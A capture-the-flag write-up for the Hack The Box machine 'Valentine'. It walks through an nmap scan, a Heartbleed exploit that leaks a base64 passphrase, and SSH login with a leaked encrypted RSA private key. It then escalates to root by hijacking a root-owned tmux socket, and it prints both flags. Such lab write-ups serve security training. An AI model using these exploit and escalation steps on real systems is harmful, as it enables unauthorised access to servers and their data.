<p><img src="/assets/images/valentine.png" alt="banner" /></p>

<h1 id="valentine-10101079">Valentine: 10.10.10.79</h1>

<h2 id="scanning">Scanning:</h2>
<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-A</span> <span class="nt">-oA</span> nmap 10.10.10.79

Starting Nmap 7.01 <span class="o">(</span> https://nmap.org  <span class="o">)</span> at 2018-05-06 20:04 EDT
Nmap scan report <span class="k">for </span>10.10.10.79
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed ports
PORT     STATE    SERVICE  VERSION
22/tcp   open     ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e <span class="o">(</span>DSA<span class="o">)</span>
|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 <span class="o">(</span>RSA<span class="o">)</span>
|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 <span class="o">(</span>ECDSA<span class="o">)</span>
80/tcp   open     http     Apache httpd 2.2.22 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.2.22 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/html).
443/tcp  open     ssl/http Apache httpd 2.2.22 ((Ubuntu))
|_http-server-header: Apache/2.2.22 (Ubuntu)
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>valentine.htb/organizationName<span class="o">=</span>valentine.htb/stateOrProvinceName<span class="o">=</span>FL/countryName<span class="o">=</span>US
| Not valid before: 2018-02-06T00:45:25
|_Not valid after:  2019-02-06T00:45:25
|_ssl-date: 2018-05-07T00:05:15+00:00<span class="p">;</span> 0s from scanner time.
2251/tcp filtered dif-port
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>70.08 seconds
</code></pre></div></div>

<p><br /></p>

<h2 id="gaining-access">Gaining Access:</h2>

<p><br /></p>

<p>First thing first let’s see what’s on those HTTP(S) applications and run a <code class="highlighter-rouge">dirb</code>.</p>

<p><img src="/assets/images/79_index.png" alt="" /></p>

<p><em>index.html</em></p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;center&gt;&lt;img</span> <span class="na">src=</span><span class="s">"omg.jpg"</span><span class="nt">/&gt;&lt;/center&gt;</span>

</code></pre></div></div>

<p>Well, look what we got. A nice picture with a heart bleeding. The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. This weakness allows stealing the information protected, under normal conditions, by the SSL/TLS encryption used to secure the Internet</p>

<p>During OSCP exam, you can use <code class="highlighter-rouge">metasploit</code> for only one machine. Thus, I decided to use this <a href="https://github.com/kevincarroll7737/tools/heartbleed-PoC">tool</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python heartbleed-exploit.py 10.10.10.79<span class="p">;</span><span class="nb">head </span>out.txt <span class="nt">-n</span> 50<span class="p">;</span> <span class="nb">rm </span>out.txt
Connecting...
Sending Client Hello...
 ... received message: <span class="nb">type</span> <span class="o">=</span> 22, ver <span class="o">=</span> 0302, length <span class="o">=</span> 66
 ... received message: <span class="nb">type</span> <span class="o">=</span> 22, ver <span class="o">=</span> 0302, length <span class="o">=</span> 885
 ... received message: <span class="nb">type</span> <span class="o">=</span> 22, ver <span class="o">=</span> 0302, length <span class="o">=</span> 331
 ... received message: <span class="nb">type</span> <span class="o">=</span> 22, ver <span class="o">=</span> 0302, length <span class="o">=</span> 4
Handshake <span class="k">done</span>...
Sending heartbeat request with length 4 :
 ... received message: <span class="nb">type</span> <span class="o">=</span> 24, ver <span class="o">=</span> 0302, length <span class="o">=</span> 16384
Received heartbeat response <span class="k">in </span>file out.txt
WARNING : server returned more data than it should - server is vulnerable!
  0000: 02 40 00 D8 03 02 53 43 5B 90 9D 9B 72 0B BC 0C  .@....SC[...r...
  0010: BC 2B 92 A8 48 97 CF BD 39 04 CC 16 0A 85 03 90  .+..H...9.......
  0020: 9F 77 04 33 D4 DE 00 00 66 C0 14 C0 0A C0 22 C0  .w.3....f.....<span class="s2">".
  0030: 21 00 39 00 38 00 88 00 87 C0 0F C0 05 00 35 00  !.9.8.........5.
  0040: 84 C0 12 C0 08 C0 1C C0 1B 00 16 00 13 C0 0D C0  ................
  0050: 03 00 0A C0 13 C0 09 C0 1F C0 1E 00 33 00 32 00  ............3.2.
  0060: 9A 00 99 00 45 00 44 C0 0E C0 04 00 2F 00 96 00  ....E.D...../...
  0070: 41 C0 11 C0 07 C0 0C C0 02 00 05 00 04 00 15 00  A...............
  0080: 12 00 09 00 14 00 11 00 08 00 06 00 03 00 FF 01  ................
  0090: 00 00 49 00 0B 00 04 03 00 01 02 00 0A 00 34 00  ..I...........4.
  00a0: 32 00 0E 00 0D 00 19 00 0B 00 0C 00 18 00 09 00  2...............
  00b0: 0A 00 16 00 17 00 08 00 06 00 07 00 14 00 15 00  ................
  00c0: 04 00 05 00 12 00 13 00 01 00 02 00 03 00 0F 00  ................
  00d0: 10 00 11 00 23 00 00 00 0F 00 01 01 30 2E 30 2E  ....#.......0.0.
  00e0: 31 2F 64 65 63 6F 64 65 2E 70 68 70 0D 0A 43 6F  1/decode.php..Co
  00f0: 6E 74 65 6E 74 2D 54 79 70 65 3A 20 61 70 70 6C  ntent-Type: appl
  0100: 69 63 61 74 69 6F 6E 2F 78 2D 77 77 77 2D 66 6F  ication/x-www-fo
  0110: 72 6D 2D 75 72 6C 65 6E 63 6F 64 65 64 0D 0A 43  rm-urlencoded..C
  0120: 6F 6E 74 65 6E 74 2D 4C 65 6E 67 74 68 3A 20 34  ontent-Length: 4
  0130: 32 0D 0A 0D 0A 24 74 65 78 74 3D 61 47 56 68 63  2....</span><span class="nv">$text</span><span class="s2">=aGVhc
  0140: 6E 52 69 62 47 56 6C 5A 47 4A 6C 62 47 6C 6C 64  nRibGVlZGJlbGlld
  0150: 6D 56 30 61 47 56 6F 65 58 42 6C 43 67 3D 3D 19  mV0aGVoeXBlCg==.
  0160: D1 9C 3E AE 23 57 C6 09 0B 9D E3 01 7F F4 92 78  ..&gt;.#W.........x
  0170: F7 5F 65 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C 0C  ._e.............

echo 'aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=='|base64 -d                  
heartbleedbelievethehype
</span></code></pre></div></div>

<p>I’ve got stuck for a while shuffling the memory. Finally, I discovered the path <code class="highlighter-rouge">/dev</code> by running <code class="highlighter-rouge">nikto -host 10.10.10.79</code> in the HTTPS application which gave me the encoded <code class="highlighter-rouge">hype_key</code>.</p>

<p><em>hype_key.txt</em></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
<span class="nt">-----END</span> RSA PRIVATE KEY-----
</code></pre></div></div>

<p>Well, the initial <code class="highlighter-rouge">nmap</code> shows that the ssh server accepts <code class="highlighter-rouge">RSA-2048</code>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">chmod </span>600 hype_key.txt
ssh <span class="nt">-i</span> hype_key.txt hype@10.10.10.79
Enter passphrase <span class="k">for </span>key <span class="s1">'hype_key.txt'</span>: heartbleedbelievethehype

Welcome to Ubuntu 12.04 LTS <span class="o">(</span>GNU/Linux 3.2.0-23-generic x86_64<span class="o">)</span>
 <span class="k">*</span> Documentation:  https://help.ubuntu.com/
New release <span class="s1">'14.04.5 LTS'</span> available.
Run <span class="s1">'do-release-upgrade'</span> to upgrade to it.

Last login: Sun May  6 17:56:59 2018 from 10.10.15.75
hype@Valentine:~<span class="nv">$ </span>
</code></pre></div></div>

<p><br /></p>

<h2 id="maintaining-access">Maintaining Access:</h2>

<p><br /></p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>N/A
</code></pre></div></div>

<p><br /></p>

<h2 id="acheive-tasks">Acheive Tasks:</h2>

<p><br /></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Localhost</span>
<span class="nb">sudo </span>scp <span class="nt">-i</span> hype_key.txt ~/git/tools/linenum.sh hype@10.10.10.79:~/
Enter passphrase <span class="k">for </span>key <span class="s1">'hype_key.txt'</span>: 
linenum.sh                                                             100%   41KB  41.2KB/s   00:0o
</code></pre></div></div>

<p>Once the <code class="highlighter-rouge">linenum.sh</code> was on the <code class="highlighter-rouge">valentine host</code> I ran it and discovered that <code class="highlighter-rouge">tmux</code> was installed.</p>

<p>I fist ran, <code class="highlighter-rouge">tmux -V</code> to see if this version was vulnerable to <code class="highlighter-rouge">utmp priv esc</code>, but it wasn’t.</p>

<p><code class="highlighter-rouge">Tmux</code> is a strong shell emulator. It gives you the opportunity to leave terminal session and come back to them without interrupting the running process by creating a persistent socket <code class="highlighter-rouge">-S</code> stored localy.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Get the root tmux socket</span>
hype@Valentine:~<span class="nv">$ </span>ps <span class="nt">-aux</span>|grep tmux
Warning: bad ps syntax, perhaps a bogus <span class="s1">'-'</span>? See http://procps.sf.net/faq.html
root       1027  0.0  0.1  26416  1688 ?        Ss   19:07   0:01 /usr/bin/tmux <span class="nt">-S</span> /.devs/dev_sess
hype       4406  0.0  0.0  13576   936 pts/0    S+   19:41   0:00 <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto tmux

<span class="c">#Connect to this socket</span>
hype@Valentine:~<span class="nv">$ </span>tmux <span class="nt">-S</span> /.devs/dev_sess
root@Valentine:/home/hype~ <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
oot@Valentine:/home/hype~ <span class="nb">cat</span> /root/root.txt
f1bb6d759df1f272914ebbc9ed7765b2
hype@Valentine:~<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-iname</span> user.txt
./Desktop/user.txt
hype@Valentine:~<span class="nv">$ </span><span class="nb">cat</span> ./Desktop/user.txt 
e6710a5464769fd5fcd216e076961750
</code></pre></div></div>

<p>So, how to manage <code class="highlighter-rouge">root tmux sockets</code> on a public server? Simple, make sure that this socket is a <code class="highlighter-rouge">root</code> dirctory</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hype@Valentine:~<span class="nv">$ </span>ps <span class="nt">-aux</span>|grep tmux
Warning: bad ps syntax, perhaps a bogus <span class="s1">'-'</span>? See http://procps.sf.net/faq.html
root       1027  0.0  0.1  26416  1688 ?        Ss   19:07   0:01 /usr/bin/tmux <span class="nt">-S</span> /.devs/dev_sess
root       4588  0.0  0.1  26420  1688 ?        Ss   19:57   0:00 tmux <span class="nt">-S</span> /root/test
hype       4653  0.0  0.0  13576   936 pts/0    S+   19:57   0:00 <span class="nb">grep</span> <span class="nt">--color</span><span class="o">=</span>auto tmux
hype@Valentine:~<span class="nv">$ </span>tmux <span class="nt">-S</span> /root/test
failed to connect to server: Permission denied
</code></pre></div></div>
